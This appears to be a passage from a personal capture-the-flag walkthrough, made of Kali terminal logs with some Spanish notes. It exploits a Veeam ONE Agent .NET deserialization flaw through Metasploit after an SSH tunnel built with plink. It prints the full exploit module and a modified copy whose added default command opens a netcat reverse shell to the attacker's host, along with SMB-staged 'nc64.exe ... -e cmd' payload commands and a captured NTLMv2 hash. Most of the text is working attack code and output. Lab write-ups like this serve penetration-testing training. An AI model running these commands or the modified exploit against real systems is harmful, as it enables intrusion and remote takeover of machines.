LastWriteTimeUtc  : 1/19/2019 3:50:50 AM
Attributes        : Archive

  ProductVersion:   9.5.4.456

The port 2805 was inaccessible from the outside world. I had to get access to the port from the attacker’s machine.

https://informationsecurity.medium.com/remote-ssh-tunneling-with-plink-exe-7831072b3d7d

https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html

download (64-bit x86)

┌──(kali㉿kali)-[~/Downloads]
└─$ cp plink.exe ../Set                
                                                                                                              
┌──(kali㉿kali)-[~/Downloads]
└─$ cd ../Set              
                                                                                                              
┌──(kali㉿kali)-[~/Set]
└─$ ls
CVE-2021-1675.ps1  hook.lnk  Info.txt   users_final.txt  winPEASany_ofs.exe
hash_michelle      hook.zip  plink.exe  users.xml

┌──(kali㉿kali)-[~/Set]
└─$ chmod +x plink.exe 

┌──(kali㉿kali)-[~/Set]
└─$ python3 -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
10.10.242.97 - - [02/Jan/2023 14:35:08] "GET /plink.exe HTTP/1.1" 200 -


*Evil-WinRM* PS C:\Users\MichelleWat\Documents> Invoke-WebRequest -Uri http://10.8.19.103:1337/plink.exe -outfile plink.exe
*Evil-WinRM* PS C:\Users\MichelleWat\Documents> ls


    Directory: C:\Users\MichelleWat\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         1/2/2023  11:35 AM         986928 plink.exe

┌──(kali㉿kali)-[~/Set]
└─$ sudo service ssh start

*Evil-WinRM* PS C:\Users\MichelleWat\Documents> echo y|& ./plink.exe -l kali -pw kali -N -R 2805:127.0.0.1:280
5 10.8.19.103
plink.exe : Using username "kali".
    + CategoryInfo          : NotSpecified: (Using username "kali".:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError

┌──(kali㉿kali)-[~/Set]
└─$ nmap -p2805 localhost
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-02 15:10 EST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.0016s latency).
Other addresses for localhost (not scanned): ::1

PORT     STATE SERVICE
2805/tcp open  wta-wsp-s

Nmap done: 1 IP address (1 host up) scanned in 0.11 seconds

metasploit

┌──(kali㉿kali)-[~/Set]
└─$ msfconsole -q     
msf6 > searchsploit veeam
[*] exec: searchsploit veeam

---------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                              |  Path
---------------------------------------------------------------------------- ---------------------------------
Veeam ONE Reporter 9.5.0.3201 - Multiple Cross-Site Request Forgery         | ashx/webapps/46765.txt
Veeam ONE Reporter 9.5.0.3201 - Persistent Cross-Site Scripting             | ashx/webapps/46766.txt
Veeam ONE Reporter 9.5.0.3201 - Persistent Cross-site Scripting (Add/Edit W | ashx/webapps/46767.txt
---------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
msf6 > search veeam

Matching Modules
================

   #  Name                                                  Disclosure Date  Rank    Check  Description
   -  ----                                                  ---------------  ----    -----  -----------
   0  exploit/windows/misc/veeam_one_agent_deserialization  2020-04-15       normal  Yes    Veeam ONE Agent .NET Deserialization


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/misc/veeam_one_agent_deserialization                                                                                              

msf6 > use 0
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/misc/veeam_one_agent_deserialization) > show options

Module options (exploit/windows/misc/veeam_one_agent_deserialization):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   HOSTINFO_NAME  AgentController  yes       Name to send in host info (must be recognized by server!)
   RHOSTS                          yes       The target host(s), see https://github.com/rapid7/metasploit-fr
                                             amework/wiki/Using-Metasploit
   RPORT          2805             yes       The target port (TCP)
   SRVHOST        0.0.0.0          yes       The local host or network interface to listen on. This must be
                                             an address on the local machine or 0.0.0.0 to listen on all add
                                             resses.
   SRVPORT        8080             yes       The local port to listen on.
   SSL            false            no        Negotiate SSL for incoming connections
   SSLCert                         no        Path to a custom SSL certificate (default is randomly generated
                                             )
   URIPATH                         no        The URI to use for this exploit (default is random)


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   2   PowerShell Stager



View the full module info with the info, or info -d command.


msf6 exploit(windows/misc/veeam_one_agent_deserialization) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf6 exploit(windows/misc/veeam_one_agent_deserialization) > set SRVHOST 10.8.19.103
SRVHOST => 10.8.19.103
msf6 exploit(windows/misc/veeam_one_agent_deserialization) > set LHOST 10.8.19.103
LHOST => 10.8.19.103
msf6 exploit(windows/misc/veeam_one_agent_deserialization) > run

[*] Started reverse TCP handler on 10.8.19.103:4444 
[*] 127.0.0.1:2805 - Connecting to 127.0.0.1:2805
[*] 127.0.0.1:2805 - Sending host info to 127.0.0.1:2805
[*] 127.0.0.1:2805 - Executing PowerShell Stager for windows/x64/meterpreter/reverse_tcp
[*] 127.0.0.1:2805 - Sending malicious handshake to 127.0.0.1:2805
[*] Exploit completed, but no session was created.

https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/windows/misc/veeam_one_agent_deserialization

ashh

Veeam ONE Agent .NET Deserialization es una vulnerabilidad de seguridad que afecta al servicio Veeam One Agent Service. Esta vulnerabilidad permite que un atacante remoto envíe datos maliciosos a través del servicio y ejecute código malintencionado en la máquina vulnerable.

Para explotar esta vulnerabilidad, el atacante debe enviar un paquete de datos malicioso a través del servicio Veeam One Agent Service utilizando técnicas de inyección de código. Una vez que el paquete de datos es recibido por el servicio, se deserializan y se ejecuta el código malintencionado incluido en el paquete.

Para evitar esta vulnerabilidad, es importante mantener el servicio Veeam One Agent Service y todas las aplicaciones relacionadas actualizadas con las últimas parches de seguridad. También es recomendable utilizar medidas de seguridad adicionales, como firewalls y sistemas de detección y prevención de intrusiones (IDS/IPS), para proteger la red contra ataques externos.

None of the 3 payloads in the module works, because Defender is killing them!

Here we can modify :)

┌──(kali㉿kali)-[/usr/share/metasploit-framework/modules/auxiliary]
└─$ locate veeam_one_agent_deserialization
/usr/share/doc/metasploit-framework/modules/exploit/windows/misc/veeam_one_agent_deserialization.md
/usr/share/metasploit-framework/modules/exploits/windows/misc/veeam_one_agent_deserialization.rb
                                                                                                              
┌──(kali㉿kali)-[/usr/share/metasploit-framework/modules/auxiliary]
└─$ cd /usr/share/metasploit-framework/modules/exploits/windows/misc/
                                                                                                              
┌──(kali㉿kali)-[/usr/…/modules/exploits/windows/misc]
└─$ ls                                    
achat_bof.rb                                     hp_magentservice.rb
actfax_raw_server_bof.rb                         hp_omniinet_1.rb
agentxpp_receive_agentx.rb                       hp_omniinet_2.rb
ahsay_backup_fileupload.rb                       hp_omniinet_3.rb
ais_esel_server_rce.rb                           hp_omniinet_4.rb
allmediaserver_bof.rb                            hp_operations_agent_coda_34.rb
altiris_ds_sqli.rb                               hp_operations_agent_coda_8c.rb
apple_quicktime_rtsp_response.rb                 hp_ovtrace.rb
asus_dpcproxy_overflow.rb                        hta_server.rb
avaya_winpmd_unihostrouter.rb                    ib_isc_attach_database.rb
avidphoneticindexer.rb                           ib_isc_create_database.rb
bakbone_netvault_heap.rb                         ibm_cognos_tm1admsd_bof.rb
bcaaa_bof.rb                                     ibm_director_cim_dllinject.rb
bigant_server_250.rb                             ibm_tsm_cad_ping.rb
bigant_server_dupf_upload.rb                     ibm_tsm_rca_dicugetidentify.rb
bigant_server.rb                                 ibm_websphere_java_deserialize.rb
bigant_server_sch_dupf_bof.rb                    ib_svc_attach.rb
bigant_server_usv.rb                             itunes_extm3u_bof.rb
bomberclone_overflow.rb                          landesk_aolnsrvr.rb
bopup_comm.rb                                    lianja_db_net.rb
borland_interbase.rb                             manageengine_eventlog_analyzer_rce.rb
borland_starteam.rb                              mercury_phonebook.rb
citrix_streamprocess_data_msg.rb                 mini_stream.rb
citrix_streamprocess_get_boot_record_request.rb  mirc_privmsg_server.rb
citrix_streamprocess_get_footer.rb               mobile_mouse_rce.rb
citrix_streamprocess_get_objects.rb              ms07_064_sami.rb
citrix_streamprocess.rb                          ms10_104_sharepoint.rb
cloudme_sync.rb                                  netcat110_nt.rb
commvault_cmd_exec.rb                            nettransport.rb
crosschex_device_bof.rb                          nvidia_mental_ray.rb
cve_2022_28381_allmediaserver_bof.rb             plugx.rb
disk_savvy_adm.rb                                poisonivy_21x_bof.rb
doubletake.rb                                    poisonivy_bof.rb
eiqnetworks_esa.rb                               poppeeper_date.rb
eiqnetworks_esa_topology.rb                      poppeeper_uidl.rb
enterasys_netsight_syslog_bof.rb                 realtek_playlist.rb
eureka_mail_err.rb                               remote_control_collection_rce.rb
fb_cnct_group.rb                                 remote_mouse_rce.rb
fb_isc_attach_database.rb                        sap_2005_license.rb
fb_isc_create_database.rb                        sap_netweaver_dispatcher.rb
fb_svc_attach.rb                                 shixxnote_font.rb
gh0st.rb                                         solidworks_workgroup_pdmwservice_file_write.rb
gimp_script_fu.rb                                splayer_content_type.rb
hp_dataprotector_cmd_exec.rb                     stream_down_bof.rb
hp_dataprotector_crs.rb                          talkative_response.rb
hp_dataprotector_dtbclslogin.rb                  tiny_identd_overflow.rb
hp_dataprotector_encrypted_comms.rb              trendmicro_cmdprocessor_addtask.rb
hp_dataprotector_exec_bar.rb                     ufo_ai.rb
hp_dataprotector_install_service.rb              unified_remote_rce.rb
hp_dataprotector_new_folder.rb                   veeam_one_agent_deserialization.rb
hp_dataprotector_traversal.rb                    vmhgfs_webdav_dll_sideload.rb
hp_imc_dbman_restartdb_unauth_rce.rb             webdav_delivery.rb
hp_imc_dbman_restoredbase_unauth_rce.rb          wifi_mouse_rce.rb
hp_imc_uam.rb                                    windows_rsh.rb
hp_loadrunner_magentproc_cmdexec.rb              wireshark_lua.rb
hp_loadrunner_magentproc.rb                      wireshark_packet_dect.rb
                                                                                                              
┌──(kali㉿kali)-[/usr/…/modules/exploits/windows/misc]
└─$ cat veeam_one_agent_deserialization.rb                           
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::CmdStager
  include Msf::Exploit::Powershell

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Veeam ONE Agent .NET Deserialization',
        'Description' => %q{
          This module exploits a .NET deserialization vulnerability in the Veeam
          ONE Agent before the hotfix versions 9.5.5.4587 and 10.0.1.750 in the
          9 and 10 release lines.

          Specifically, the module targets the HandshakeResult() method used by
          the Agent. By inducing a failure in the handshake, the Agent will
          deserialize untrusted data.

          Tested against the pre-patched release of 10.0.0.750. Note that Veeam
          continues to distribute this version but with the patch pre-applied.
        },
        'Author' => [
          'Michael Zanetta', # Discovery
          'Edgar Boda-Majer', # Discovery
          'wvu' # Module
        ],
        'References' => [
          ['CVE', '2020-10914'],
          ['CVE', '2020-10915'], # This module
          ['ZDI', '20-545'],
          ['ZDI', '20-546'], # This module
          ['URL', 'https://www.veeam.com/kb3144']
        ],
        'DisclosureDate' => '2020-04-15', # Vendor advisory
        'License' => MSF_LICENSE,
        'Platform' => 'win',
        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],
        'Privileged' => false,
        'Targets' => [
          [
            'Windows Command',
            {
              'Arch' => ARCH_CMD,
              'Type' => :win_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/windows/powershell_reverse_tcp'
              }
            }
          ],
          [
            'Windows Dropper',
            {
              'Arch' => [ARCH_X86, ARCH_X64],
              'Type' => :win_dropper,
              'DefaultOptions' => {
                'PAYLOAD' => 'windows/x64/meterpreter_reverse_tcp'
              }
            }
          ],
          [
            'PowerShell Stager',
            {
              'Arch' => [ARCH_X86, ARCH_X64],
              'Type' => :psh_stager,
              'DefaultOptions' => {
                'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'
              }
            }
          ]
        ],
        'DefaultTarget' => 2,
        'DefaultOptions' => {
          'WfsDelay' => 10
        },
        'Notes' => {
          'Stability' => [SERVICE_RESOURCE_LOSS], # Connection queue may fill?
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options([
      Opt::RPORT(2805),
      OptString.new(
        'HOSTINFO_NAME',
        [
          true,
          'Name to send in host info (must be recognized by server!)',
          'AgentController'
        ]
      )
    ])
  end

  def check
    vprint_status("Checking connection to #{peer}")
    connect

    CheckCode::Detected("Connected to #{peer}.")
  rescue Rex::ConnectionError => e
    CheckCode::Unknown("#{e.class}: #{e.message}")
  ensure
    disconnect
  end

  def exploit
    print_status("Connecting to #{peer}")
    connect

    print_status("Sending host info to #{peer}")
    sock.put(host_info(datastore['HOSTINFO_NAME']))

    res = sock.get_once
    vprint_good("<-- Host info reply: #{res.inspect}") if res

    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")

    case target['Type']
    when :win_cmd
      execute_command(payload.encoded)
    when :win_dropper
      # TODO: Create an option to execute the full stager without hacking
      # :linemax or calling execute_command(generate_cmdstager(...).join(...))
      execute_cmdstager(
        flavor: :psh_invokewebrequest, # NOTE: This requires PowerShell >= 3.0
        linemax: 9001 # It's over 9000
      )
    when :psh_stager
      execute_command(cmd_psh_payload(
        payload.encoded,
        payload.arch.first,
        remove_comspec: true
      ))
    end
  rescue EOFError, Rex::ConnectionError => e
    fail_with(Failure::Unknown, "#{e.class}: #{e.message}")
  ensure
    disconnect
  end

  def execute_command(cmd, _opts = {})
    vprint_status("Executing command: #{cmd}")

    serialized_payload = Msf::Util::DotNetDeserialization.generate(
      cmd,
      gadget_chain: :TextFormattingRunProperties,
      formatter: :BinaryFormatter # This is _exactly_ what we need
    )

    print_status("Sending malicious handshake to #{peer}")
    sock.put(handshake(serialized_payload))

    res = sock.get_once
    vprint_good("<-- Handshake reply: #{res.inspect}") if res
  rescue EOFError, Rex::ConnectionError => e
    fail_with(Failure::Unknown, "#{e.class}: #{e.message}")
  end

  def host_info(name)
    meta = [0x0205].pack('v')
    packed_name = [name.length].pack('C') + name

    pkt = meta + packed_name

    vprint_good("--> Host info packet: #{pkt.inspect}")
    pkt
  end

  def handshake(serialized_payload)
    # A -1 status indicates a failure, which will trigger the deserialization
    status = [-1].pack('l<')

    length = status.length + serialized_payload.length
    type = 7
    attrs = 1
    kontext = 0

    header = [length, type, attrs, kontext].pack('VvVV')
    padding = "\x00" * 18
    result = status + serialized_payload

    pkt = header + padding + result

    vprint_good("--> Handshake packet: #{pkt.inspect}")
    pkt
  end

end

https://vulners.com/metasploit/MSF:EXPLOIT-WINDOWS-MISC-VEEAM_ONE_AGENT_DESERIALIZATION-

https://www.welivesecurity.com/la-es/2014/10/17/como-crear-primer-modulo-metasploit/

https://www.pinguytaz.net/index.php/2019/07/13/creando-un-modulo-metasploit/

and finally will be like:

┌──(kali㉿kali)-[/usr/…/modules/exploits/windows/misc]
└─$ cat veeam_one_agent_deserialization.rb
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::CmdStager
  include Msf::Exploit::Powershell

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Veeam ONE Agent .NET Deserialization',
        'Description' => %q{
          This module exploits a .NET deserialization vulnerability in the Veeam
          ONE Agent before the hotfix versions 9.5.5.4587 and 10.0.1.750 in the
          9 and 10 release lines.

          Specifically, the module targets the HandshakeResult() method used by
          the Agent. By inducing a failure in the handshake, the Agent will
          deserialize untrusted data.

          Tested against the pre-patched release of 10.0.0.750. Note that Veeam
          continues to distribute this version but with the patch pre-applied.
        },
        'Author' => [
          'Michael Zanetta', # Discovery
          'Edgar Boda-Majer', # Discovery
          'wvu' # Module
        ],
        'References' => [
          ['CVE', '2020-10914'],
          ['CVE', '2020-10915'], # This module
          ['ZDI', '20-545'],
          ['ZDI', '20-546'], # This module
          ['URL', 'https://www.veeam.com/kb3144']
        ],
        'DisclosureDate' => '2020-04-15', # Vendor advisory
        'License' => MSF_LICENSE,
        'Platform' => 'win',
        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],
        'Privileged' => false,
        'Targets' => [
          [
            'Windows Command',
            {
              'Arch' => ARCH_CMD,
              'Type' => :win_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/windows/powershell_reverse_tcp'
              }
            }
          ],
          [
            'Windows Dropper',
            {
              'Arch' => [ARCH_X86, ARCH_X64],
              'Type' => :win_dropper,
              'DefaultOptions' => {
                'PAYLOAD' => 'windows/x64/meterpreter_reverse_tcp'
              }
            }
          ],
          [
            'PowerShell Stager',
            {
              'Arch' => [ARCH_X86, ARCH_X64],
              'Type' => :psh_stager,
              'DefaultOptions' => {
                'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'
              }
            }
          ],
          [
            'Windows Set Command',
            {
              'Arch' => ARCH_CMD,
              'Type' => :win_cmd1,
              'DefaultOptions' => {
                'PAYLOAD' => 'windows/x64/exec'
              }
            }
          ]
        ],
        'DefaultTarget' => 2,
        'DefaultOptions' => {
          'WfsDelay' => 10
        },
        'Notes' => {
          'Stability' => [SERVICE_RESOURCE_LOSS], # Connection queue may fill?
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options([
      Opt::RPORT(2805),
      OptString.new(
        'CMD',
        [
          true,
          'Command to be executed on the target',
          'nc.exe 10.8.10.103 4444 -e cmd'
        ]
      ),
      OptString.new(
        'HOSTINFO_NAME',
        [
          true,
          'Name to send in host info (must be recognized by server!)',
          'AgentController'
        ]
      )
    ])
  end

  def check
    vprint_status("Checking connection to #{peer}")
    connect

    CheckCode::Detected("Connected to #{peer}.")
  rescue Rex::ConnectionError => e
    CheckCode::Unknown("#{e.class}: #{e.message}")
  ensure
    disconnect
  end

  def exploit
    print_status("Connecting to #{peer}")
    connect

    print_status("Sending host info to #{peer}")
    sock.put(host_info(datastore['HOSTINFO_NAME']))

    res = sock.get_once
    vprint_good("<-- Host info reply: #{res.inspect}") if res

    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")

    case target['Type']
    when :win_cmd1
      execute_command(datastore['CMD'])
    when :win_cmd
      execute_command(payload.encoded)
    when :win_dropper
      # TODO: Create an option to execute the full stager without hacking
      # :linemax or calling execute_command(generate_cmdstager(...).join(...))
      execute_cmdstager(
        flavor: :psh_invokewebrequest, # NOTE: This requires PowerShell >= 3.0
        linemax: 9001 # It's over 9000
      )
    when :psh_stager
      execute_command(cmd_psh_payload(
        payload.encoded,
        payload.arch.first,
        remove_comspec: true
      ))
    end
  rescue EOFError, Rex::ConnectionError => e
    fail_with(Failure::Unknown, "#{e.class}: #{e.message}")
  ensure
    disconnect
  end

  def execute_command(cmd, _opts = {})
    vprint_status("Executing command: #{cmd}")

    serialized_payload = Msf::Util::DotNetDeserialization.generate(
      cmd,
      gadget_chain: :TextFormattingRunProperties,
      formatter: :BinaryFormatter # This is _exactly_ what we need
    )

    print_status("Sending malicious handshake to #{peer}")
    sock.put(handshake(serialized_payload))

    res = sock.get_once
    vprint_good("<-- Handshake reply: #{res.inspect}") if res
  rescue EOFError, Rex::ConnectionError => e
    fail_with(Failure::Unknown, "#{e.class}: #{e.message}")
  end

  def host_info(name)
    meta = [0x0205].pack('v')
    packed_name = [name.length].pack('C') + name

    pkt = meta + packed_name

    vprint_good("--> Host info packet: #{pkt.inspect}")
    pkt
  end

  def handshake(serialized_payload)
    # A -1 status indicates a failure, which will trigger the deserialization
    status = [-1].pack('l<')

    length = status.length + serialized_payload.length
    type = 7
    attrs = 1
    kontext = 0

    header = [length, type, attrs, kontext].pack('VvVV')
    padding = "\x00" * 18
    result = status + serialized_payload

    pkt = header + padding + result

    vprint_good("--> Handshake packet: #{pkt.inspect}")
    pkt
  end

end


La línea `when :win_cmd1` es parte de una estructura de control de flujo condicional, en este caso una estructura `case`. La línea `execute_command(datastore['CMD'])` es una llamada a una función o método que ejecuta un comando en la consola del sistema operativo. La variable `datastore` es un diccionario o hashmap que almacena valores que se pueden utilizar en el contexto del script. En este caso, se está obteniendo el valor del elemento `CMD` del diccionario y se está pasando como parámetro a la función `execute_command`.

Es posible que este código forme parte de un script de Metasploit, una herramienta de seguridad que se utiliza para realizar pruebas de penetración y explotación de vulnerabilidades en sistemas y aplicaciones. En este caso, la estructura `case` puede utilizarse para determinar qué acción realizar en función del valor de una variable. Al ejecutar la función `execute_command` con el valor del elemento `CMD` del diccionario `datastore`, se estaría ejecutando el comando especificado por el usuario en la consola del sistema operativo.

es correcto

privesc

┌──(kali㉿kali)-[~/Set]
└─$ locate nc.exe      
/home/kali/Downloads/steel_mountain/nc.exe
/home/kali/ra2/nc.exe
/usr/lib/mono/4.5/cert-sync.exe
/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
/usr/share/windows-resources/binaries/nc.exe
                                                                                                              
┌──(kali㉿kali)-[~/Set]
└─$ cp /home/kali/ra2/nc.exe nc.exe   

┌──(kali㉿kali)-[~]
└─$ rlwrap nc -lnvp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444

┌──(kali㉿kali)-[~/Set]
└─$ sudo smbserver.py -smb2support -username me -password me share .
[sudo] password for kali: 
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

┌──(kali㉿kali)-[~/Set]
└─$ msfconsole -q
msf6 > search veeam

Matching Modules
================

   #  Name                                                  Disclosure Date  Rank    Check  Description
   -  ----                                                  ---------------  ----    -----  -----------
   0  exploit/windows/misc/veeam_one_agent_deserialization  2020-04-15       normal  Yes    Veeam ONE Agent .NET Deserialization


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/misc/veeam_one_agent_deserialization                                                                                              

msf6 > use 0
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/misc/veeam_one_agent_deserialization) > show options

Module options (exploit/windows/misc/veeam_one_agent_deserialization):

   Name           Current Setting               Required  Description
   ----           ---------------               --------  -----------
   CMD            nc.exe 10.8.19.103 4444 -e   yes       Command to be executed on the target
                  cmd
   HOSTINFO_NAME  AgentController               yes       Name to send in host info (must be recognized by s
                                                          erver!)
   RHOSTS                                       yes       The target host(s), see https://github.com/rapid7/
                                                          metasploit-framework/wiki/Using-Metasploit
   RPORT          2805                          yes       The target port (TCP)
   SRVHOST        0.0.0.0                       yes       The local host or network interface to listen on.
                                                          This must be an address on the local machine or 0.
                                                          0.0.0 to listen on all addresses.
   SRVPORT        8080                          yes       The local port to listen on.
   SSL            false                         no        Negotiate SSL for incoming connections
   SSLCert                                      no        Path to a custom SSL certificate (default is rando
                                                          mly generated)
   URIPATH                                      no        The URI to use for this exploit (default is random
                                                          )


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   2   PowerShell Stager



View the full module info with the info, or info -d command.

msf6 exploit(windows/misc/veeam_one_agent_deserialization) > set target 3
target => 3
msf6 exploit(windows/misc/veeam_one_agent_deserialization) > show options

Module options (exploit/windows/misc/veeam_one_agent_deserialization):

   Name           Current Setting               Required  Description
   ----           ---------------               --------  -----------
   CMD            nc.exe 10.8.19.103 4444 -e   yes       Command to be executed on the target
                  cmd
   HOSTINFO_NAME  AgentController               yes       Name to send in host info (must be recognized by s
                                                          erver!)
   RHOSTS                                       yes       The target host(s), see https://github.com/rapid7/
                                                          metasploit-framework/wiki/Using-Metasploit
   RPORT          2805                          yes       The target port (TCP)
   SRVHOST        0.0.0.0                       yes       The local host or network interface to listen on.
                                                          This must be an address on the local machine or 0.
                                                          0.0.0 to listen on all addresses.
   SRVPORT        8080                          yes       The local port to listen on.
   SSL            false                         no        Negotiate SSL for incoming connections
   SSLCert                                      no        Path to a custom SSL certificate (default is rando
                                                          mly generated)
   URIPATH                                      no        The URI to use for this exploit (default is random
                                                          )


Payload options (windows/x64/exec):

   Name      Current Setting                 Required  Description
   ----      ---------------                 --------  -----------
   CMD       nc.exe 10.8.19.103 4444 -e cmd  yes       The command string to execute
             
   EXITFUNC  process                         yes       Exit technique (Accepted: '', seh, thread, process, n
                                                       one)


Exploit target:

   Id  Name
   --  ----
   3   Windows Set Command



View the full module info with the info, or info -d command.

msf6 exploit(windows/misc/veeam_one_agent_deserialization) > set rhosts 127.0.0.1
msf6 exploit(windows/misc/veeam_one_agent_deserialization) > set SRVHOST 10.8.19.103
SRVHOST => 10.8.19.103
msf6 exploit(windows/misc/veeam_one_agent_deserialization) > set LHOST 10.8.19.103
LHOST => 10.8.19.103
msf6 exploit(windows/misc/veeam_one_agent_deserialization) > set CMD net use a: \\\10.8.19.103\\share /user:me me&a:\nc.exe 10.8.19.103 4444 -e cmd
CMD => net use a: \10.8.19.103\share /user:me me&a:nc.exe 10.8.19.103 4444 -e cmd


escaping

msf6 exploit(windows/misc/veeam_one_agent_deserialization) > set CMD net use a: \\\\10.8.19.103\\share /user:me me&a:\\nc.exe 10.8.19.103 4444 -e cmd
CMD => net use a: \\10.8.19.103\share /user:me me&a:\nc.exe 10.8.19.103 4444 -e cmd

┌──(kali㉿kali)-[~/Set]
└─$ sudo smbserver.py -smb2support -username me -password me share .
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.29.100,50026)
[*] AUTHENTICATE_MESSAGE (\me,SET)
[*] User SET\me authenticated successfully
[*] me:::aaaaaaaaaaaaaaaa:5bbe8b996151d7487041e65c3ac73871:0101000000000000804a8dacf21ed90132e0bb3b4254c90e0000000001001000760056004e006a004f00740071005a0003001000760056004e006a004f00740071005a000200100052005600490053004d007900580064000400100052005600490053004d0079005800640007000800804a8dacf21ed901060004000200000008003000300000000000000000000000003000008e51280f7855608ab05047cf8394e261f4c7b89e9e48340093784f0cd13f40a80a001000000000000000000000000000000000000900200063006900660073002f00310030002e0038002e00310039002e003100300033000000000000000000
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:share)
[*] Disconnecting Share(1:IPC$)


uhmm 

┌──(kali㉿kali)-[~/Set]
└─$ locate nc64.exe
/home/kali/hackthebox/nc64.exe
/home/kali/msdt-follina/msdt-follina/nc64.exe
/home/kali/ra2/nc64.exe

┌──(kali㉿kali)-[~/Set]
└─$ cp /home/kali/ra2/nc64.exe nc64.exe
                                                                                                              
┌──(kali㉿kali)-[~/Set]
└─$ chmod +x nc64.exe                  
                                                                                                              
┌──(kali㉿kali)-[~/Set]
└─$ ls
CVE-2021-1675.ps1  hash_michelle  hook.zip  nc64.exe  plink.exe        users.xml
hash_final         hook.lnk       Info.txt  nc.exe    users_final.txt  winPEASany_ofs.exe

msf6 exploit(windows/misc/veeam_one_agent_deserialization) > set CMD net use a: \\\\10.8.19.103\\share /user:me me&a:\\nc64.exe 10.8.19.103 4444 -e cmd
CMD => net use a: \\10.8.19.103\share /user:me me&a:\nc64.exe 10.8.19.103 4444 -e cmd
msf6 exploit(windows/misc/veeam_one_agent_deserialization) > exploit

[*] 127.0.0.1:2805 - Connecting to 127.0.0.1:2805
[*] 127.0.0.1:2805 - Sending host info to 127.0.0.1:2805
[*] 127.0.0.1:2805 - Executing Windows Set Command for windows/x64/exec
[*] 127.0.0.1:2805 - Sending malicious handshake to 127.0.0.1:2805
[*] Exploit completed, but no session was created.

msf6 exploit(windows/misc/veeam_one_agent_deserialization) > options

Module options (exploit/windows/misc/veeam_one_agent_deserialization):

   Name           Current Setting                               Required  Description
   ----           ---------------                               --------  -----------
   CMD            net use a: \\10.8.19.103\share /user:me me&a  yes       Command to be executed on the target
                  :\nc64.exe 10.8.19.103 4444 -e cmd
   HOSTINFO_NAME  AgentController                               yes       Name to send in host info (must be recognized by server!)
   RHOSTS         127.0.0.1                                     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Usin
                                                                          g-Metasploit
   RPORT          2805                                          yes       The target port (TCP)
   SRVHOST        10.8.19.103                                   yes       The local host or network interface to listen on. This must be an address on the
                                                                           local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT        8080                                          yes       The local port to listen on.
   SSL            false                                         no        Negotiate SSL for incoming connections
   SSLCert                                                      no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                                                      no        The URI to use for this exploit (default is random)


Payload options (windows/x64/exec):

   Name      Current Setting                                                           Required  Description
   ----      ---------------                                                           --------  -----------
   CMD       net use a: \\10.8.19.103\share /user:me me&a:\nc64.exe 10.8.19.103 4444   yes       The command string to execute
             -e cmd
   EXITFUNC  process                                                                   yes       Exit technique (Accepted: '', seh, thread, process, none)


Exploit target:

   Id  Name
   --  ----
   3   Windows Set Command



View the full module info with the info, or info -d command.

